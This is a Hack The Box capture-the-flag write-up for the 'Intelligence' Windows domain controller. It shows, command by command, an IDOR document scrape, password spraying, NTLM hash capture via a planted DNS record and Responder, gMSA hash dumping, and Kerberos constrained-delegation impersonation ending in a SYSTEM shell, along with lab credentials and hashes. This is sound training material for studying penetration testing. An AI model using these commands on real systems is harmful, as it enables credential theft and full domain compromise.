---
title:     "Hack The Box - Intelligence"
tags: [windows,medium,idor,dns,ad,metadata,gmsa,kerberos,constrained delegation]
categories: HackTheBox
---
[![info_card](/img/intelligence/info_card.png)](/img/intelligence/info_card.png)

# User

Intelligence is a medium rated machine on HackTheBox by [Micah](https://www.hackthebox.eu/home/users/profile/22435). For the user part we will find default credentials through an IDOR vulnerability on a website hosting PDF's. This will give us access to a smb share where we find a powershell script being run every 5 minutes. We can abuse this scheduled task and capture the hash for another user with responder after adding a DNS entry. After cracking the hash we can retrieve the NTLM hash for a service account over gMSA. With this credentials we can now abuse the constrained delegtion over our target, impersonate the administrator user and psexec into the machine.

## Nmap

As always we start our enumeration off with an nmap scan against all ports, followed by a script and version detection scan against the open ones.

`Allports`
```
$ sudo nmap -p- -T4 intelligence.htb
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 06:23 UTC
Nmap scan report for intelligence.htb (10.129.39.201)
Host is up (0.12s latency).
Not shown: 65515 filtered ports
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49677/tcp open  unknown
49678/tcp open  unknown
49693/tcp open  unknown
49700/tcp open  unknown
51052/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 229.17 seconds
```

`Script and version`
```
$ sudo nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49693,49700,51052 -sC -sV intelligence.htb
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-04 06:29 UTC
Nmap scan report for intelligence.htb (10.129.39.201)
Host is up (0.037s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-04 06:29:41Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-07-04T06:31:09+00:00; 0s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-07-04T06:31:09+00:00; 0s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-07-04T06:31:09+00:00; 0s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Not valid before: 2021-04-19T00:43:16
|_Not valid after:  2022-04-19T00:43:16
|_ssl-date: 2021-07-04T06:31:09+00:00; 0s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
49700/tcp open  msrpc         Microsoft Windows RPC
51052/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2021-07-04T06:30:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.47 seconds
```

## PDF IDOR
The open ports and the dns name hint on this machine being a domain controller. Port 80 being open on a DC is unusual and might bring some quick success, so we will start there. Going over to the page we see an almost completely static website with most things filled from a default template.

[![homepage](/img/intelligence/homepage.png)](/img/intelligence/homepage.png)

The only thing not looking fully default is the download functionality, where we can download 2 PDF's.

[![pdf_download](/img/intelligence/pdf_download.png)](/img/intelligence/pdf_download.png)

The PDF's seem to be structured in the format `<year>-<month>-<day>-upload.pdf`, if there are no additional checks on the website we might be able to access different PDF's, which aren't supposed to be public.
For this we create our wordlist first with a short python script.

```py
for i in range(2019, 2022):
    for j in range(1, 13):
        for k in range (1, 32):
            year  = str(i)
            month = str(j).rjust(2, '0')
            day = str(k).rjust(2, '0')
            print(f'{year}-{month}-{day}')
```

```
$ python get_dates.py  > dates
```

We use this wordlist with ffuf to fuzz for alternative dates/PDF names and get indeed a lot of hits. To download all the files in the next step we export the ffuf output as CSV.

```
$ ffuf -w dates -u http://intelligence.htb/documents/FUZZ-upload.pdf  -o ffuf.out  -of csv

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://intelligence.htb/documents/FUZZ-upload.pdf
 :: Wordlist         : FUZZ: dates
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

2020-01-20              [Status: 200, Size: 11632, Words: 157, Lines: 127]
2020-01-23              [Status: 200, Size: 11557, Words: 167, Lines: 136]
2020-01-30              [Status: 200, Size: 26706, Words: 242, Lines: 193]
2020-01-01              [Status: 200, Size: 26835, Words: 241, Lines: 209]
2020-01-02              [Status: 200, Size: 27002, Words: 229, Lines: 199]
2020-01-04              [Status: 200, Size: 27522, Words: 223, Lines: 196]
2020-02-11              [Status: 200, Size: 25245, Words: 241, Lines: 198]
2020-01-10              [Status: 200, Size: 26400, Words: 232, Lines: 205]
2020-02-17              [Status: 200, Size: 11228, Words: 167, Lines: 132]
2020-01-22              [Status: 200, Size: 28637, Words: 236, Lines: 224]
2020-02-28              [Status: 200, Size: 11543, Words: 167, Lines: 131]
2020-01-25              [Status: 200, Size: 26252, Words: 225, Lines: 193]
2020-03-04              [Status: 200, Size: 26194, Words: 235, Lines: 202]
2020-03-05              [Status: 200, Size: 26124, Words: 221, Lines: 205]
2020-03-12              [Status: 200, Size: 27143, Words: 233, Lines: 213]
2020-03-13              [Status: 200, Size: 24888, Words: 213, Lines: 204]
2020-03-17              [Status: 200, Size: 27227, Words: 221, Lines: 210]
...[snip]...
2021-02-25              [Status: 200, Size: 26700, Words: 228, Lines: 180]
2021-03-01              [Status: 200, Size: 11254, Words: 175, Lines: 135]
2021-03-07              [Status: 200, Size: 10676, Words: 164, Lines: 139]
2021-03-10              [Status: 200, Size: 25109, Words: 240, Lines: 199]
2021-03-18              [Status: 200, Size: 27992, Words: 220, Lines: 203]
2021-03-21              [Status: 200, Size: 26810, Words: 229, Lines: 205]
2021-03-25              [Status: 200, Size: 27327, Words: 231, Lines: 211]
2021-03-27              [Status: 200, Size: 12127, Words: 166, Lines: 141]
:: Progress: [2232/2232] :: Job [1/1] :: 1249 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

Using this CSV we can now use wget on all the PDF's in ffuf's output to dump them.

```
$ for date in $(cat ../ffuf.out | grep intelligence | awk -F, '{print $1}'); do wget http://intelligence.htb/documents/$date-upload.pdf; done
--2021-07-04 06:47:44--  http://intelligence.htb/documents/2020-01-20-upload.pdf
Resolving intelligence.htb (intelligence.htb)... 10.129.39.201
Connecting to intelligence.htb (intelligence.htb)|10.129.39.201|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 11632 (11K) [application/pdf]
Saving to: ‘2020-01-20-upload.pdf’

2020-01-20-upload.pdf                                               100%[=================================================================================================================================================================>]  11.36K  --.-KB/s    in 0.001s

2021-07-04 06:47:44 (10.8 MB/s) - ‘2020-01-20-upload.pdf’ saved [11632/11632]

...[snip]...
```

Looking through the files we see 2 particularily interesting ones. `2020-12-30-upload.pdf` is stating that there is a script running to check web server connectivity and that they are planning to disable their service accounts due to a security risk they pose.

[![it_update](/img/intelligence/it_update.png)](/img/intelligence/it_update.png)

`2020-06-04-upload.pdf` gives even better information for now. It leaves us with a default password, meaning if we get a list of username we might be lucky and a user did not change his password.

[![acc_guide](/img/intelligence/acc_guide.png)](/img/intelligence/acc_guide.png)

Looking at the PDF's with exiftool we see the Creator field seems to contain possible usernames.

```
$ exiftool 2020-06-04-upload.pdf
ExifTool Version Number         : 12.16
File Name                       : 2020-06-04-upload.pdf
Directory                       : .
File Size                       : 26 KiB
File Modification Date/Time     : 2021:04:01 17:00:00+00:00
File Access Date/Time           : 2021:07:04 06:47:47+00:00
File Inode Change Date/Time     : 2021:07:04 06:47:47+00:00
File Permissions                : rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jason.Patterson
```

We can extract all of the usernames with a bash one liner for further work.

```
$ exiftool * | grep Creator | awk -F": " '{print $2}' | sort | uniq | tee users
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```

## SMB

Using crackmapexec to check the password for every user we see it is valid for `Tiffany.Molina` and she has access to the `Users` and `IT` share.

```
$ crackmapexec smb intelligence.htb -u users -p NewIntelligenceCorpUser9876 --continue-on-success
SMB         10.129.39.201   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.39.201   445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
SMB         10.129.39.201   445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE
...[snip]...

SMB         10.129.39.201   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
...[snip]...
```

```
$ crackmapexec smb intelligence.htb -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
SMB         10.129.39.201   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.129.39.201   445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
SMB         10.129.39.201   445    DC               [+] Enumerated shares
SMB         10.129.39.201   445    DC               Share           Permissions     Remark
SMB         10.129.39.201   445    DC               -----           -----------     ------
SMB         10.129.39.201   445    DC               ADMIN$                          Remote Admin
SMB         10.129.39.201   445    DC               C$                              Default share
SMB         10.129.39.201   445    DC               IPC$            READ            Remote IPC
SMB         10.129.39.201   445    DC               IT              READ
SMB         10.129.39.201   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.39.201   445    DC               SYSVOL          READ            Logon server share
SMB         10.129.39.201   445    DC               Users           READ
```

To go through the files quicker and with more tools available we turn on recursive mode in smbclient, turn off the prompt an download all files.

```
$ smbclient //intelligence.htb/Users -U Tiffany.Molina%NewIntelligenceCorpUser9876
Try "help" to get a list of possible commands.
smb: \ > recurse on
smb: \ > prompt off
smb: \ > mget *
getting file \desktop.ini of size 174 as desktop.ini (1.3 KiloBytes/sec) (average 1.3 KiloBytes/sec)
...[snip]...
```

Going through the retrieved data we can grab the user flag.

```
$ wc -c Tiffany.Molina/Desktop/user.txt
34 Tiffany.Molina/Desktop/user.txt
```

# Root

## Scheduled Task

In hte IT share we see the earlier mentioned powershell script.

```
$ smbclient //intelligence.htb/IT -U Tiffany.Molina%NewIntelligenceCorpUser9876
Try "help" to get a list of possible commands.
smb: \ > ls
  .                                   D        0  Mon Apr 19 00:50:55 2021
  ..                                  D        0  Mon Apr 19 00:50:55 2021
  downdetector.ps1                    A     1046  Mon Apr 19 00:50:55 2021

                3770367 blocks of size 4096. 1457382 blocks available
smb: \ > get downdetector.ps1
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (8.0 KiloBytes/sec) (average 8.0 KiloBytes/sec)
```

The script checks all DNS records for ones that starts with `web` and uses `Invoke-WebRequest` with default credentials on them. If the server does not respond it sends an email to ted stating the host is down. If we can add a DNS entry for our ip address starting with `web` we can possibly exfiltrate the hash with responder.

```sh
# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```

For this we use [dnstool.py](https://github.com/dirkjanm/krbrelayx) with the credentials for Tiffany and add our dns entry.

```
$ python3 krbrelayx/dnstool.py -u 'INTELLIGENCE\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r 'webabc' -d 10.10.14.25 10.129.39.201
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
/home/jack/htb/boxes/intelligence/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
  res = dnsresolver.query(zone, 'SOA')
[-] Adding extra record
[+] LDAP operation completed successfully
```

We quickly set up responder to listen and wait. After a maximum of 5 minutes Ted.Graves connect's to us and presents us his hash for the challenge.

```
$ sudo responder -I tun0 --lm
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
...[snip]...
[+] Listening for events...

[HTTP] NTLMv2 Client   : 10.129.39.201
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:32c3ba6463cae549:B749FB09FC641570CAD9B3808D6B576A:0101000000000000315FBB98F770D70132B0C7FAA4F6FB9100000000020008005300300033004C0001001E00570049004E002D0036004B00590038005400410045005500490052005200040014005300300033004C002E004C004F00430041004C0003003400570049004E002D0036004B005900380054004100450055004900520052002E005300300033004C002E004C004F00430041004C00050014005300300033004C002E004C004F00430041004C00080030003000000000000000000000000020000074890C17D3B85FA1916ABE239800A52F115F3FFB27976ECE42E30D96975ED6810A001000000000000000000000000000000000000900380048005400540050002F007700650062006100620063002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

Using hashcat the hash cracks quite quickly leaving us with the password `Mr.Teddy` for `Ted.Graves`.

```
$ hashcat -m 5600 -O  hash /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
...[snip]...
TED.GRAVES::intelligence:32c3ba6463cae549:b749fb09fc641570cad9b3808d6b576a:0101000000000000315fbb98f770d70132b0c7faa4f6fb9100000000020008005300300033004c0001001e00570049004e002d0036004b00590038005400410045005500490052005200040014005300300033004c002e004c004f00430041004c0003003400570049004e002d0036004b005900380054004100450055004900520052002e005300300033004c002e004c004f00430041004c00050014005300300033004c002e004c004f00430041004c00080030003000000000000000000000000020000074890c17d3b85fa1916abe239800a52f115f3ffb27976ece42e30d96975ed6810a001000000000000000000000000000000000000900380048005400540050002f007700650062006100620063002e0069006e00740065006c006c006900670065006e00630065002e006800740062000000000000000000:Mr.Teddy

Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: TED.GRAVES::intelligence:32c3ba6463cae549:b749fb09f...000000
Time.Started.....: Sun Jul  4 17:14:01 2021 (8 secs)
Time.Estimated...: Sun Jul  4 17:14:09 2021 (0 secs)
Guess.Base.......: File (/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1361.1 kH/s (2.37ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10814458/14344384 (75.39%)
Rejected.........: 5114/10814458 (0.05%)
Restore.Point....: 10810360/14344384 (75.36%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: MyRt -> Mr.Ced&V33t

Started: Sun Jul  4 17:14:01 2021
Stopped: Sun Jul  4 17:14:11 2021
```

We still cannot login to the machine as `Ted.Graves` so we check if we might be able to escalate to another user as him using bloodhound.

```
$ bloodhound-python  -u Ted.Graves -p Mr.Teddy -c All -d intelligence.htb -dc dc.intelligence.htb -ns  10.129.39.201
```

Bloodhound shows an interesting edge for the earlier mentioned service account. If we manage to get to `svc_int` we can escalate to domain administrator in the next step abusing constrained delegation on the domain controller.

[![bloodhound](/img/intelligence/bloodhound.png)](/img/intelligence/bloodhound.png)

## gMSA

One possible way to get to a service can be gMSA. Looking in the author's github we see he has even realeased a [tool](https://github.com/micahvandeusen/gMSADumper) for remotely dumping the gMSA password for a service account.
Using this tool as `Ted.Graves` on `svc_int` we can indeed retrieve the password hash for the account.

```
$ python gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l dc.intelligence.htb
svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2
```

## Constrained delegation

Now we can abuse the earlier seen constrained delegation. Since we are using kerberos for this we have to first fix the time on our vm by syncing it with the dc.

```
$ sudo ntpdate -s intelligence.htb
```

Then we can create a service ticket with the spn `www/dc.intelligence.htb` impersonating the domain administrator.

```
$ getST.py -spn www/dc.intelligence.htb intelligence.htb/svc_int -impersonate administrator -hashes aad3b435b51404eeaad3b435b51404ee:d64b83fe606e6d3005e20ce0ee932fe2 -dc-ip 10.129.39.201
Impacket v0.9.23.dev1+20210111.162220.7100210f - Copyright 2020 SecureAuth Corporation

[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

We export the ticket to our `KRB5CCNAME` environment variable to use it in the next step.

```
$ export KRB5CCNAME=/home/jack/htb/boxes/intelligence/administrator.ccache
```

Since impacket automatically converts the requested `www` ticket to a needed `host` ticket, we can now simply psexec into the machine and grab the root flag.

```
$ psexec.py intelligence.htb/administrator@dc.intelligence.htb -k -no-pass
Impacket v0.9.23.dev1+20210111.162220.7100210f - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file qoihNols.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service EDIt on dc.intelligence.htb.....
[*] Starting service EDIt.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>dir \users\administrator\desktop
 Volume in drive C has no label.
 Volume Serial Number is E3EF-EBBD

 Directory of C:\users\administrator\desktop

04/18/2021  05:51 PM    <DIR>          .
04/18/2021  05:51 PM    <DIR>          ..
07/03/2021  10:31 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   5,994,917,888 bytes free

C:\Windows\system32>
```
